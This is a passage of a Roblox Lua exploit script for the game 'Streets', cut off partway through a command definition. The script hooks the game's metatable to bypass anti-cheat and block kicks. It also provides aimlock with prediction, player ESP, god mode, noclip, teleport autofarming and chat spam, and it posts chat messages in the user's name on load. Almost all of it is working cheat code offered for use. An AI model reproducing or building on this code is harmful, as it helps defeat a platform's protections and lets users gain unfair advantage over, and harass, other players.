if pcall(readfile,"CyrusStreetsAdminSettings") then
    writefile("CyrusStreetsAdminSettings.json",readfile("CyrusStreetsAdminSettings"))
	if delfile then
		 delfile("CyrusStreetsAdminSettings")
	end
end 
local Tick = tick()
getgenv().Players = game:GetService'Players'
getgenv().TeleportService = game:GetService'TeleportService'
getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
getgenv().StarterGui = game:GetService'StarterGui'
getgenv().TweenService = game:GetService'TweenService'
getgenv().UserInput = game:GetService'UserInputService'
getgenv().RunService = game:GetService'RunService'
getgenv().Lighting = game:GetService'Lighting'
getgenv().CoreGui = game:GetService'CoreGui'
getgenv().HttpService = game:GetService'HttpService'
getgenv().MarketplaceService = game:GetService'MarketplaceService'
getgenv().LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
getgenv().Mouse = LP:GetMouse()
getgenv().GetChar = function() return LP.Character or LP.CharacterAdded:Wait() end
GetChar():WaitForChild('Humanoid',10) -- allows auto-execution
local PlayerTable,Commands,KeyTable,UrlEncoder,AdminUsers,DontStompWhitelisted = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";},{},{}
local NormalWS,NormalJP,NormalHH = GetChar().Humanoid.WalkSpeed,GetChar().Humanoid.JumpPower,GetChar().Humanoid.HipHeight
local AimLock,GodMode,AutoDie,AliasesEnabled,Noclipping,AutoFarm,ItemEsp,WalkShoot,flying,AutoStomp,Freecam,CamLocking,FeLoop,TpBypass,HealBot = false,false,false,true,false,false,false,false,false,false,false,false,false,false,false
local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget,CamlockPlayer,LoopPlayer
local AirWalk = Instance.new'Part'
local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
local CText,CmdFrame,MainFrame,DmgIndicator = Instance.new("TextBox",Cframe),Instance.new("Frame",Cframe),Instance.new('Frame',CoreGui.RobloxGui),Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)
local ScrollingFrame,SearchBar,Credits = Instance.new('ScrollingFrame',MainFrame),Instance.new('TextBox',MainFrame),Instance.new('TextLabel',MainFrame)
local BulletColour,ItemEspColour,EspColour = ColorSequence.new(Color3.fromRGB(144,0,0)),Color3.fromRGB(200,200,200),Color3.fromRGB(200,200,200)
local UseDraw,DrawingT = pcall(assert,Drawing,'test')
local ShiftSpeed,ControlSpeed,WalkSpeed,HealBotHealth,BlinkSpeed,AimbotVelocity = 25,8,16,25,1,5
local OldFov = workspace.CurrentCamera.FieldOfView
local Config = "CyrusStreetsAdminSettings"
local TargetPart,AimlockMode = "Prediction","LeftClick"
Players:Chat("Cyrus is my god")
Players:Chat("Hey I'm a cyrus' streets admin user1")
local RobloxInForeground = true 
local DrawTable = {
	['LineColour'] = Color3.fromRGB(0,144,0);
	['Thickness'] = 1;
	['Transparency'] = 1;
	['Visible'] = true;
}

if UseDraw then 
	DrawingT = Drawing.new'Text'
	DrawingT.Visible = true
	DrawingT.Center = true 
	DrawingT.Size = 15
	DrawingT.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X / 2) - 450, (workspace.CurrentCamera.ViewportSize.Y - 125))
	DrawingT.Color = Color3.fromRGB(255,255,255)
	DrawingT.Text = "Current WalkSpeed: "..GetChar().Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..GetChar().Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget)
end 

if workspace:FindFirstChild'Armoured Truck' then
	PartTable = {
		['Burger'] = workspace:WaitForChild'Burger | $15';
		['Drink'] = workspace:WaitForChild'Drink | $15';
		['Ammo'] = workspace:WaitForChild'Buy Ammo | $25';
		['Pipe'] = workspace:WaitForChild'Pipe | $100';
		['Machete'] = workspace:WaitForChild'Machete | $70';
		['SawedOff'] = workspace:WaitForChild'Sawed Off | $150';
		['Spray'] = workspace:WaitForChild'Spray | $20';
		['Uzi'] = workspace:WaitForChild'Uzi | $150';
		['Glock'] = workspace:WaitForChild'Glock | $200';
	}
    workspace["Armoured Truck"]:Destroy()
elseif workspace:FindFirstChild'TPer' then 
    workspace['TPer']:Destroy()
end

LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
--^ Ty to Jayy#0648 for this "Hack" for bringing back normal chat 

local SettingsTable = {
   Keys = {};
   ClickTpKey = "";
   ShiftSpeed = 25;
   ControlSpeed = 8;
   TargetPart = "Prediction";
   AimlockMode = "LeftClick";
   BlinkMode = "Shift";
   AimbotVelocity = 10;
}

-- Hotkey start

local function savesettings()
	writefile(Config..".json",HttpService:JSONEncode(SettingsTable))
    local SettingsToSave = HttpService:JSONDecode(readfile(Config..".json"))
    Keys = SettingsToSave.Keys;
	ClickTpKey = SettingsToSave.ClickTpKey;
	ShiftSpeed = SettingsToSave.ShiftSpeed;
	ControlSpeed = SettingsToSave.ControlSpeed;
	TargetPart = SettingsToSave.TargetPart;
	AimlockMode = SettingsToSave.AimlockMode;
	BlinkMode = SettingsToSave.BlinkMode;
	AimbotVelocity = SettingsToSave.AimbotVelocity;
end 

getgenv().updateSettings = function()
    local New = { 
        Keys = Keys;
		ClickTpKey = ClickTpKey;
		ShiftSpeed = ShiftSpeed;
		ControlSpeed = ControlSpeed;
		TargetPart = TargetPart;
		AimlockMode = AimlockMode;
		BlinkMode = BlinkMode;
		AimbotVelocity = AimbotVelocity;
    }
    writefile(Config..".json",HttpService:JSONEncode(New))
end

local function runsettings()
	local SettingsToRun = HttpService:JSONDecode(readfile(Config..".json"))
    Keys = SettingsToRun.Keys
	ClickTpKey = SettingsToRun.ClickTpKey
	BlinkMode = SettingsToRun.BlinkMode
	if SettingsToRun.AimlockMode then 
		AimlockMode = SettingsToRun.AimlockMode
	end
	if SettingsToRun.TargetPart then 
		TargetPart = SettingsToRun.TargetPart
	end
	if SettingsToRun.ShiftSpeed and SettingsToRun.ControlSpeed then 
		ShiftSpeed = SettingsToRun.ShiftSpeed;
		ControlSpeed = SettingsToRun.ControlSpeed;
	end 
	if SettingsToRun.AimbotVelocity then 
		AimbotVelocity = SettingsToRun.AimbotVelocity
	end
end

if readfile and writefile then 
	local Work,Error = pcall(readfile,Config..".json")
	if not Work then 
		local Work,Error = pcall(savesettings)
		if not Work then 
			print'Error with saving settings' 
		end 
	else
		local Work,Error = pcall(runsettings)
		if not Work then 
			print'Error with running settings'
		end 
	end
end 

-- Hotkey end 

-- Bypass Start

local gamememe = getrawmetatable(game)
local Closure,Caller = newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus
local writeable = setreadonly or make_writeable
local callingscript = getcallingscript or get_calling_script
local name,index,nindex = gamememe.__namecall,gamememe.__index,gamememe.__newindex
writeable(gamememe,false)

gamememe.__index = Closure(function(self,Index)
	if TpBypass and callingscript and callingscript() ~= script and Index == "HumanoidRootPart" then -- was requested to add this
		return index(self,"Torso")
	end 
	return index(self,Index)
end)

gamememe.__newindex = Closure(function(self,Property,b)
if Caller() then return nindex(self,Property,b) end
	if self:IsA'Humanoid' then 
	game:GetService'StarterGui':SetCore('ResetButtonCallback',true)
		if Property == "WalkSpeed" then
			if WalkShoot then 
				return
			end
		end
		if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
			return 
		end
	end
	if Property == "CFrame" and self:IsDescendantOf(LP.Character) then
		return 
	end
	return nindex(self,Property,b)
end)

gamememe.__namecall = Closure(function(self,...)
local Arguments = {...}
	if Caller() then 
		if getnamecallmethod() == "FindFirstChild" then
			if Arguments[1] == "RealHumanoidRootPart" then 
				Arguments[1] = "HumanoidRootPart" 
				return name(self,unpack(Arguments))
			end
		end
		return name(self,...) 
	end 
		if getnamecallmethod() == "Destroy" and tostring(self) == "BodyGyro" or getnamecallmethod() == "Destroy" and tostring(self) == "BodyVelocity" then
			return wait(9e9)
		end
		if getnamecallmethod() == "BreakJoints" and self.Name == LP.Character.Name then
			return wait(9e9)
		end
		if getnamecallmethod() == "Kick" or getnamecallmethod() == "Destroy" and tostring(self) == tostring(LP) then 
			return
		end
		if getnamecallmethod() == "WaitForChild" or getnamecallmethod() == "FindFirstChild" then 
			if callingscript and callingscript() ~= script and TpBypass and Arguments[1] == "HumanoidRootPart" then
				Arguments[1] = "Torso"
				return name(self,unpack(Arguments))
			end
		end
		if getnamecallmethod() == "FireServer" then
				if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
					return wait(9e9)
				end
				if Arguments[1] == "hey" then 
					return wait(9e9)
				end
				if Arguments[1] == "play" then
					local TempTable = {}
					tostring(Arguments[2]):gsub('.',function(Char)
							if UrlEncoder[Char] then 
								table.insert(TempTable,UrlEncoder[Char])
							else 
							table.insert(TempTable,Char)
						end
					end)
					Arguments[2] = table.concat(TempTable,"")
					PlayOnDeath = Arguments[2]
					return name(self,unpack(Arguments))
				end
		if Arguments[1] == "stop" then 
			PlayOnDeath = nil 
		end
	end
	if LP.Character.FindFirstChildOfClass(LP.Character,"Tool") and typeof(Arguments[1]) == "CFrame" then
		if AimlockTarget and AimLock then
			if TargetPart == "Prediction" then
				if AimlockTarget.FindFirstChild(AimlockTarget,"HumanoidRootPart") then
					return name(self,AimlockTarget.Head.CFrame + AimlockTarget.HumanoidRootPart.Velocity / AimbotVelocity)
				else 
					return name(self,AimlockTarget.Head.CFrame + AimlockTarget.Torso.Velocity / AimbotVelocity)
				end 
			else
				if AimlockTarget.FindFirstChild(AimlockTarget,TargetPart) then 
					return name(self,AimlockTarget[TargetPart].CFrame) 
				else
					notif(tostring(AimlockTarget).." doesn't have that part in their character.","I recommend switching to something else.",5,nil)
				end
			end
		end
	end 
    return name(self,...)
end)

writeable(gamememe,true)
-- Bypass End

getgenv().notif = function(title,message,length,icon)
	StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
end

getgenv().Teleport = function(Part)
if not typeof(Part) == "CFrame" then return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
	if not GetChar():FindFirstChild'HumanoidRootPart' then 
		PartFound.CFrame = Part
	else
		local Play = TweenService:Create(PartFound, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
		Play:play()
	end
end

local function hasItem(Player,Item)
    if type(Item) == "boolean" then
        local Tool = Player.Character:FindFirstChildOfClass'Tool'
        if Tool then 
            return Tool.Name
        else
            return 'none'
        end
    end
    if Player.Backpack:FindFirstChild(Item) or Player.Character:FindFirstChild(Item) then
        return 'yes' 
    else
        return 'no'
    end
end 

local function checkHp(Plr)
	return Plr:FindFirstChildOfClass'Humanoid' and Plr.Humanoid.Health or "No Humanoid"
end

local function LegacyEsp(Player)
if not Player.Character or not Player.Character:FindFirstChild'Head' then return end 
	local Esp1 = Instance.new("BillboardGui",Player.Character)
	local Text = Instance.new("TextLabel",Esp1)
	Esp1.Adornee = Player.Character.Head
	Esp1.Name = "[ESP]"..Player.Name
	Esp1.Size = UDim2.new(0,100,0,100)
	Esp1.StudsOffset = Vector3.new(0,1,0)
	Esp1.AlwaysOnTop = true
	Text.BackgroundTransparency = 1
	Text.Position = UDim2.new(0,0,0,0)
	Text.Size = UDim2.new(1,0,0,40)
	Text.TextStrokeTransparency = 0.5
	Text.TextSize = 15
	local PCChild = Player.Character:GetChildren()
	RunService.Stepped:Connect(function()
		if Player and Player.Character and Player.Character:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
			Text.Text = Player.Name.." Position: "..math.floor((GetChar().Head.Position - Player.Character.Head.Position).magnitude)
			Text.TextStrokeColor3 = EspColour
			Text.TextColor3 = EspColour
		end
	end)
	return Esp1
end 

local EspTable = {} 
local function espPlayer(Player,Method,IsUser)
if not Player.Character or not Player.Character:FindFirstChild'Head' then return end
if not IsUser then IsUser = "false" else IsUser = "true" end 
if table.find(AdminUsers,Player.UserId) then IsUser = "true" end 
	if not UseDraw or Method == "Legacy" then
		local Esp1 = LegacyEsp(Player)
		local CAdded;
		CAdded = Player.CharacterAdded:Connect(function(C)
			if table.find(EspTable,Player.UserId) then 
				C:WaitForChild('Head',10)
				Esp1 = LegacyEsp(Player)
			else 
				CAdded:Disconnect()
			end
		end)
	else 
		local TopLeft,TopRight,BottomLeft,BottomRight = Drawing.new'Line',Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'
		local Text = Drawing.new'Text'
		TopLeft.Color = Color3.fromRGB(144,0,0)
		TopRight.Color = Color3.fromRGB(144,0,0)
		BottomLeft.Color = Color3.fromRGB(144,0,0)
		BottomRight.Color = Color3.fromRGB(144,0,0)
		local Tracer = Drawing.new'Line'
		PlayerTable[#PlayerTable + 1] = {Player,TopLeft,TopRight,BottomLeft,BottomRight,Text,Tracer,IsUser}
	end 
end

local function Unesp(P)
	for i = 1,#PlayerTable do
		if PlayerTable[i] and PlayerTable[i][1] == P then
			PlayerTable[i][2]:Remove()
			PlayerTable[i][3]:Remove()
			PlayerTable[i][4]:Remove()
			PlayerTable[i][5]:Remove()
			PlayerTable[i][6]:Remove()
			PlayerTable[i][7]:Remove()
			PlayerTable[i][8] = nil 
			table.remove(PlayerTable,i)
		end 
	end
end 

local function GrabThing(Thing,OldPos)
if not PartTable then 
	notif("Can't tp to "..Thing,"as you are not playing normal streets!",5,"rbxassetid://1281284684") return 
end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
local Anim = Instance.new'Animation'
Anim.AnimationId = "rbxassetid://188632011"
local Track = GetChar().Humanoid:LoadAnimation(Anim)
PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
wait()
	repeat  
		Track:play(.1,1,1)
		PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0)
		RunService.Heartbeat:wait()
	until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild'KO' or GetChar().Humanoid.Health == 0
	PartFound.CFrame = OldPos
	return true
end 

local function Button1Down()
local MTarget = Mouse.Target
	if GetChar():FindFirstChild'Zetox Btools' then 
		Mouse.Target:Destroy()
	end
	if MTarget and MTarget.Parent then 
		local NTarget = MTarget.Parent 
		if not Players:GetPlayerFromCharacter(NTarget) then NTarget = NTarget.Parent end 
		if not Players:GetPlayerFromCharacter(NTarget) then return end 
		if NTarget ~= LP.Character and NTarget ~= AimlockTarget and AimLock and AimlockMode == "LeftClick" then 
			AimlockTarget = NTarget
			local Connection;
			Connection = Players:GetPlayerFromCharacter(NTarget).CharacterAdded:Connect(function(C)
				if tostring(AimlockTarget) == tostring(C) then 
					AimlockTarget = C 
				else
					Connection:Disconnect()
				end 
			end)
			notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
		end
	end
end

local function BehindAWall(Target)
	local RYEBread = Ray.new(workspace.CurrentCamera.CoordinateFrame.p,Target.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position)
	local RYEBreadHit = workspace:FindPartOnRay(RYEBread)
	if RYEBreadHit then 
		if RYEBreadHit:IsDescendantOf(Target) then 
			return false
		else
			return true 
		end 
	end 
end

local function closestToMouse()
local ClosestPos,ClosestPlayer = math.huge,nil
	for i,v in pairs(Players:GetPlayers()) do 
		if v.Character and v.Character:FindFirstChild'Head' and v ~= LP then 
			local Dist = (v.Character.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position).magnitude
			local RYETarget = Ray.new(workspace.CurrentCamera.CoordinateFrame.Position,(Mouse.Hit.p - workspace.CurrentCamera.CoordinateFrame.Position)).unit
			local RYEHit,RYEPos = workspace:FindPartOnRay(RYETarget,workspace)
			local NewPos = math.floor((RYEPos - v.Character.Head.Position).magnitude)
			if NewPos < 500 and NewPos < ClosestPos and not BehindAWall(v.Character) then
				ClosestPos = NewPos
				ClosestPlayer = v 
			end
		end
	end
	return ClosestPlayer
end

local function Button2Down()
if Mouse.Target then 
	local Target = Mouse.Target.Parent 
	if Target:FindFirstChild'Lock' and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
		if Target.Locker.Value then 
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			else
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			end
		end
	end
	if AimLock and AimlockMode == "RightClick" and KeyTable['Shift'] then 
		AimlockTarget = closestToMouse().Character
		local Connection;
		Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
			if tostring(AimlockTarget) == tostring(C) then 
				AimlockTarget = C 
			else
				Connection:Disconnect()
			end 
		end)
		notif("AimlockTarget","has been set to"..AimlockTarget.Name,5,nil)
	end 
end

local function FreeCam(Speed)
if not GetChar():FindFirstChild'Head' then return end 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
	Speed = Speed or 35
	GetChar().Head.Anchored = true 
	local FreecamPart = Instance.new('Part',workspace)
	FreecamPart.Name = "FreecamPart"
	FreecamPart.Position = GetChar().Head.Position + Vector3.new(0,5,0)
	FreecamPart.Transparency = 1
	FreecamPart.CanCollide = false
	FreecamPart.Anchored = true
	workspace.CurrentCamera.CameraSubject = FreecamPart
	repeat wait()
		local Pos = Vector3.new()
		local Look = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
		local PartPos = FreecamPart.Position
		if KeyTable['w'] then
			Pos = Pos + Vector3.new(0,0,-1)
		elseif KeyTable['a'] then
			Pos = Pos + Vector3.new(-1,0,0)
		elseif KeyTable['s'] then
			Pos = Pos + Vector3.new(0,0,1)
		elseif KeyTable['d'] then
			Pos = Pos + Vector3.new(1,0,0)
		elseif KeyTable['Space'] then
			Pos = Pos + Vector3.new(0,1,0)
		elseif KeyTable['Control'] then
			Pos = Pos + Vector3.new(0,-1,0)
		end 
		FreecamPart.CFrame = CFrame.new(PartPos,PartPos + Look) * CFrame.new(Pos * Speed)
	until not Freecam or GetChar().Humanoid.Health == 0
	workspace.CurrentCamera.CameraSubject = GetChar()
	GetChar().Head.Anchored = false 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
end

local function b(Text)
	DmgIndicator.Visible = true 
	DmgIndicator.Text = Text
	wait(5)
	DmgIndicator.Text = "" 
	DmgIndicator.Visible = false 
end 

local function Char(Plr)
local Tool = Plr:FindFirstChildOfClass'Tool'
	if Tool:FindFirstChild'Fire' then 
		return 'shot you',Tool
	else 
		return 'hit you',Tool
	end
end 

getgenv().AddCommand = function(CommandF,Name,Alias,Help)
	Commands[#Commands + 1] = {['Function'] = CommandF,['Name'] = Name,['Alias'] = Alias,['Help'] = Help}
end
getgenv().FindCommand = function(Command)
	for i = 1,#Commands do 
		if Commands[i].Name:lower() == Command or AliasesEnabled and table.find(Commands[i].Alias,Command) then
			return Help and Commands[i].Name.." "..Commands[i].Help or Commands[i].Function
		end
	end
end

getgenv().CheckCommand = function(Chat)
	Chat = string.gsub(Chat, "\r", "")
	local Arguments = string.split(Chat," ")
	local NCommand = FindCommand(table.remove(Arguments,1):lower())
	if NCommand then 
		local Work,Error = pcall(NCommand,Arguments)
		if not Work then 
			wait(0.5)
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was an error with this command, I have set it to your clipboard. Send it to Cy (with the command you used) and it should be fixed next update.","All")
			if setclipboard then 
				setclipboard(Error)
			else 
				print(Error)
			end
		end
	end
end

getgenv().PlrFinder = function(Plr)
local NewPlr,Player = Plr:lower(),Players:GetPlayers()
if #NewPlr == 2 and NewPlr == "me" then return LP end 
if NewPlr == "all" then return Player end 
	for i = 1,#Player do 
		if Player[i].Name:lower():sub(1,#NewPlr) == NewPlr then 
			return Player[i]
		end
	end
end

local JustDoubleJumped = false 
local function HumanoidState(Old,New)
	if New == Enum.HumanoidStateType.Landed and JustDoubleJumped then 
		local Anim = Instance.new'Animation'
		Anim.AnimationId = "rbxassetid://129423030" 
		local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
		wait(0.3)
		AnimTrack:play()
		JustDoubleJumped = false
	elseif New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding and NoGh or flying then
      	GetChar().Humanoid.PlatformStand = false
		GetChar().Humanoid:ChangeState(8)
  	end
end

local function DoubleJump()
	if GetChar() and GetChar().Humanoid and DoubleJumpEnabled then
	    GetChar().Humanoid:ChangeState(3)
	    local Anim = Instance.new'Animation'
	    Anim.AnimationId = "rbxassetid://229782914"
	    local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
	    AnimTrack:play(.1,1,1.5)
		JustDoubleJumped = true
	end
end

getgenv().find = function(Item)
  for i,v in pairs(workspace:GetChildren()) do 
      if v.Name == "RandomSpawner" and v:FindFirstChild'Model' then
      local Handle = v.Model.Handle
        if Item == "Cash" and Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
          return v
        elseif Item == "Shotty" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
          return v
        elseif Item == "Sawed Off" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
          return v 
        elseif Item == "Uzi" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
          return v 
        elseif Item == "All" then 
          return v
      end
    end
  end
end

local function uselessfunction(Thing)
local Model = Thing:WaitForChild('Model',10)
if Model then 
	local Handle = Thing.Model.Handle
		if Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
			return "Cash"
		elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
			return "Shotty"
		elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
			return "Sawed Off"
		elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
			return "Uzi"
		elseif Handle:FindFirstChild'Blade' and string.find(Handle.Blade.TextureID,"12177251") then 
			return "Katana"
		end
	end
end

local function addBillBoardGui(Item)
	local Itemx = uselessfunction(Item)
	if not Itemx then return end 
	local Esp1 = Instance.new("BillboardGui",Item)
	local Text = Instance.new("TextLabel",Esp1)
	Esp1.Adornee = Item
	Esp1.Size = UDim2.new(0,100,0,100)
	Esp1.StudsOffset = Vector3.new(0,1,0)
	Esp1.AlwaysOnTop = true
	Text.BackgroundTransparency = 1
	Text.Position = UDim2.new(0,0,0,0)
	Text.Size = UDim2.new(1,0,0,40)
	Text.TextColor3 = ItemEspColour
	Text.TextStrokeTransparency = 0.5
	Text.TextSize = 15
	Text.TextStrokeColor3 = ItemEspColour
	Text.Text = Itemx
end 	

workspace.ChildAdded:Connect(function(Part)
	if Part.Name == "RandomSpawner" then
		if AutoFarm then 
			farm("Cash")
		end
		if ItemEsp then 
			addBillBoardGui(Part)
		end
	end
end)


getgenv().farm = function(Item)
  for i,v in pairs(workspace:GetChildren()) do 
	if v.Name == "RandomSpawner" then 
		if find(Item) and type(find(Item)) == "userdata" then 
			Teleport(find(Item).CFrame)
			wait(3)
		else 
			notif("Farm "..Item,"None of "..Item.." on the map",5,"rbxassetid://1281284684")
			break;
	   	end
      end
   end
end

AddCommand(function()
	AliasesEnabled = not AliasesEnabled
	notif("AliasesEnabled","Has been set to "..tostring(AliasesEnabled),5,nil) 
end,"usealias",{},"Turns on / off Aliases")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		MainFrame.Visible = not MainFrame.Visible
	end
end,"help",{"commands","cmds"},"Gives you the commands help info")

AddCommand(function()
	local Btool = Instance.new('Tool',LP.Backpack)
	Btool.Name = "Zetox Btools" 
end,"btools",{},"Gives you Btools")

AddCommand(function()
	local Children = LP.PlayerGui.HUD:GetChildren()
	for i = 1,#Children do
		if Children[i]:IsA'Frame' then 
			Children[i].Active = not Children[i].Active 
			Children[i].Draggable = not Children[i].Draggable
		end
	end
end,"draggablegui",{},"Makes the HP/KO/Stamina bar draggable")

AddCommand(function()
	NoGh = not NoGh
	notif("Nogh","Has been set to "..tostring(NoGh),5,nil) 
end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Makes it so you can't be ground hit")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GodMode = not GodMode
		GetChar():BreakJoints()
	end
end,"godmode",{"god"},"Gods your player (Breaks tools)")

AddCommand(function(Arguments)
	local Tool = GetChar():FindFirstChildOfClass'Tool'
    if Tool then
        Tool.Parent = LP.Backpack
        Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
        Tool.Parent = GetChar()
    else 
        notif("NO TOOLS","ONE TOOL IS NEEDED",5,nil)
    end
end,"grippos",{"grip"},"[1 2 3 4 5 6] - changes grip pos to the arguments you set (First 3 are CFrame,last 3 are Vector)")

AddCommand(function(Arguments)
local GDesc = game:GetDescendants()
	for i = 1,Arguments[1] or 50 do 
		for i = 1,#GDesc do 
			if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
				GDesc[i].Click:FireServer()
				wait()
			end
		end
	end
end,"spamclick",{},"spams the Click remote and makes annoying sounds")

AddCommand(function()
local WChild = workspace:GetChildren()
	for i = 1,#WChild do 
		if WChild[i].Name == "Door" and WChild[i]:FindFirstChild'Click' and WChild[i]:FindFirstChild'Lock' then
			WChild[i].Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			WChild[i].Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			wait()
		end
	end
end,"doors",{},"locks/unlocks doors")

local SpamDelay,SpamMessage,Spamming = 1,"Cyrus' Admin Or No Admin",false 
AddCommand(function(Arguments)
	if Arguments[1] then 
		SpamMessage = table.concat(Arguments," ")
	end 
	Spamming = not Spamming 
end,"spam",{},"Spams a message you set")

AddCommand(function(Arguments)
	SpamDelay = Arguments[1] or 1 
end,"spamdelay",{},"Delays the spam for [amount] Default: 1 second")

AddCommand(function()
local GDesc = game:GetDescendants()
	for i = 1,10 do 
		for i = 1,#GDesc do 
			if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
				GDesc[i].Click:FireServer()
			end
		end
	end
end,"muteallradios",{"muteradios"},"Mutes all radios (does not loop)")

AddCommand(function(Arguments)
	if Arguments[1] then 
		Normalwalk = true
		WalkShoot = true 
		GetChar().Humanoid.WalkSpeed = Arguments[1]
		WalkSpeed = Arguments[1]
	end
end,"speed",{"ws"},"Changes your Humanoids WalkSpeed")

AddCommand(function()
	WalkShoot = not WalkShoot
end,"walkshoot",{"noslow"},"Allows you to turn on / off walk shooting")

AddCommand(function(Arguments)
	Normalwalk = false
	ControlSpeed = Arguments[1]
	updateSettings()
end,"crouchspeed",{"cspeed"},"Changes your Crouching speed")

AddCommand(function(Arguments)
	Normalwalk = false
	ShiftSpeed = Arguments[1]
	updateSettings()
end,"sprintspeed",{"sspeed"},"Changes your sprinting speed")

AddCommand(function(Arguments)
	GetChar().Humanoid.HipHeight = Arguments[1]
end,"hipheight",{"hh"},"Changes your Humanoids HipHeight")

AddCommand(function(Arguments)
	GetChar().Humanoid.JumpPower = Arguments[1]
end,"jumppower",{"jp"},"Changes your Humanoids JumpPower")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
	end
end,"rejoin",{"rj"},"Rejoins your CURRENT game server")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GetChar():BreakJoints()
	end
end,"reset",{"re"},"SUICIDE IS PAINLESS IT BRINGS ON MANY CHANGES")

AirWalk.Anchored = true 
AirWalk.Size = Vector3.new(5,1,5)
AirWalk.Transparency = 1 
AirWalk.Material = "Neon"
AddCommand(function(Arguments)
	AirWalkOn = not AirWalkOn 
	AirWalk.Parent = AirWalkOn and workspace or not AirWalkOn and nil 
end,"airwalk",{},"Allows you to float in the air")

local NeverSitting = false 
AddCommand(function()
NeverSitting = not NeverSitting
	if NeverSitting then
		local toParent = workspace:GetDescendants()
		for i = 1,#toParent do 
			if string.find(toParent[i].ClassName:lower(),'seat') then 
				toParent[i].Parent = CoreGui
			end
		end
	else
		local toParent = CoreGui:GetChildren()
		for i = 1,#toParent do 
			if string.find(toParent[i].ClassName:lower(),'seat') then 
				toParent[i].Parent = workspace
			end
		end
	end
end,"neversit",{"nsit"},"Never sit")

AddCommand(function()
	AutoDie = not AutoDie
end,"autodie",{"autoreset"},"When Ko'ed auto kills you")

AddCommand(function()
	Noclipping = not Noclipping
	notif("Command: Noclip: ","Noclip has been set to "..tostring(Noclipping),5,"rbxassetid://1281284684")
end,"noclip",{},"Allows you to walk through walls")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character and Player.Character:FindFirstChild'Head' and Player ~= LP then 
